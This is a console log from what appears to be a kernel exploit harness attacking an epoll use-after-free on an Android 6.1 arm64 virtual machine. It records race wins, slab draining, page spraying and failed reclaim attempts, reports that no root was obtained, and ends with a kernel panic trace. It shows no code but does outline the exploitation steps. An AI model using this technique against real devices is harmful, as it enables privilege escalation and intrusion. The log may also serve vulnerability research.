[*] Completed 120000 / 150000 iterations (wins=27)...
[ 2660.861242][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9600 freed before hlist_del_rcu
[*] Completed 125000 / 150000 iterations (wins=27)...
[*] Completed 130000 / 150000 iterations (wins=27)...
[*] Completed 135000 / 150000 iterations (wins=27)...
[*] Completed 140000 / 150000 iterations (wins=27)...
[ 3042.228761][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9cc0 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 144066 (total wins=28). Draining...
[*] Slab drain: 265 -> 38 slabs (delta=227)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 28) to avoid cleanup panic.
[*] Completed 145000 / 150000 iterations (wins=28)...
[ 3114.159678][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9900 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 146895 (total wins=29). Draining...
[*] Slab drain: 267 -> 42 slabs (delta=225)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 29) to avoid cleanup panic.
[ 3156.799114][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9180 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 148124 (total wins=30). Draining...
[*] Slab drain: 267 -> 43 slabs (delta=224)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 30) to avoid cleanup panic.
[*] Completed 150000 / 150000 iterations (wins=30)...
==========================================================
[-] Failed to achieve root within 150000 iterations.
[*] FINAL TELEMETRY:
[*]   Race Wins:       30
[*]   Reclaim Hits:    0
[*]   Fires:           0
[*]   Panics Avoided:  30
[*]   Leaked EPs:      30
[*]   Final uid=2000 euid=2000 (started as uid=2000)
==========================================================
[ 3211.505794][   T56] list_del corruption. prev->next should be ffffff80045ea468, but was ffffff8009da91c0. (prev=ffffff8009da91c0)
[ 3211.509321][   T56] ------------[ cut here ]------------
[ 3211.511018][   T56] kernel BUG at lib/list_debug.c:61!
[ 3211.512953][   T56] Internal error: Oops - BUG: 00000000f2000800 [#1] PREEMPT SMP
[ 3211.515049][   T56] Modules linked in:
[ 3211.516193][   T56] CPU: 1 PID: 56 Comm: harness Not tainted 6.1.23-android14-4-maybe-dirty #1
[ 3211.517387][   T56] Hardware name: linux,dummy-virt (DT)
[ 3211.518982][   T56] pstate: 604000c5 (nZCv daIF +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
[ 3211.520672][   T56] pc : __list_del_entry_valid+0xc8/0xe0
[ 3211.521992][   T56] lr : __list_del_entry_valid+0xc8/0xe0
[ 3211.522732][   T56] sp : ffffffc009cdbc40
[ 3211.523218][   T56] x29: ffffffc009cdbc40 x28: ffffff8003c2a380 x27: 0000000000000000
[ 3211.524209][   T56] x26: 0000000000000000 x25: 0000000000000000 x24: 0000000000080007
[ 3211.525004][   T56] x23: ffffff80045ea478 x22: ffffffc00972c000 x21: 0000000000000000
[ 3211.525857][   T56] x20: ffffff80045ea450 x19: ffffff8009da91b8 x18: ffffffc009ccd078
[ 3211.526637][   T56] x17: 0000000010e2957a x16: ffffffffffffffff x15: 0000000000000004
[ 3211.527663][   T56] x14: ffffffc00976f700 x13: 0000000000000fff x12: 0000000000000003
[ 3211.528913][   T56] x11: 00000000ffffefff x10: c0000000ffffefff x9 : 107771811464fa00
[ 3211.530317][   T56] x8 : 107771811464fa00 x7 : 205b5d3439373530 x6 : 352e31313233205b
[ 3211.531227][   T56] x5 : ffffffc00992628f x4 : ffffffc008855e74 x3 : 0000000000000000
[ 3211.531738][   T56] x2 : 0000000000000000 x1 : ffffffc009cdba00 x0 : 000000000000006d
[ 3211.532521][   T56] Call trace:
[ 3211.532944][   T56]  __list_del_entry_valid+0xc8/0xe0
[ 3211.533472][   T56]  remove_wait_queue+0x34/0x80
[ 3211.535322][   T56]  ep_clear_and_put+0x98/0x1dc
[ 3211.536482][   T56]  ep_eventpoll_release+0x20/0x38
[ 3211.537138][   T56]  __fput+0xfc/0x2dc
[ 3211.537895][   T56]  ____fput+0x18/0x2c
[ 3211.538753][   T56]  task_work_run+0xd8/0x104
[ 3211.539821][   T56]  do_exit+0x29c/0xa50
[ 3211.540605][   T56]  do_group_exit+0xa0/0xa4
[ 3211.541279][   T56]  __arm64_sys_exit_group+0x20/0x24
[ 3211.542414][   T56]  invoke_syscall+0x60/0x130
[ 3211.543143][   T56]  el0_svc_common+0xbc/0x100
[ 3211.543714][   T56]  do_el0_svc+0x34/0xd0
[ 3211.544203][   T56]  el0_svc+0x34/0xc4
[ 3211.544860][   T56]  el0t_64_sync_handler+0x8c/0xfc
[ 3211.545331][   T56]  el0t_64_sync+0x1a0/0x1a4
[ 3211.547265][   T56] Code: d0006b80 91282000 aa0803e3 942484d4 (d4210000) 
[ 3211.548897][   T56] ---[ end trace 0000000000000000 ]---
[ 3211.550418][   T56] Kernel panic - not syncing: Oops - BUG: Fatal exception
[ 3211.551842][   T56] SMP: stopping secondary CPUs
[ 3211.553802][   T56] Kernel Offset: disabled
[ 3211.554615][   T56] CPU features: 0x22000,2023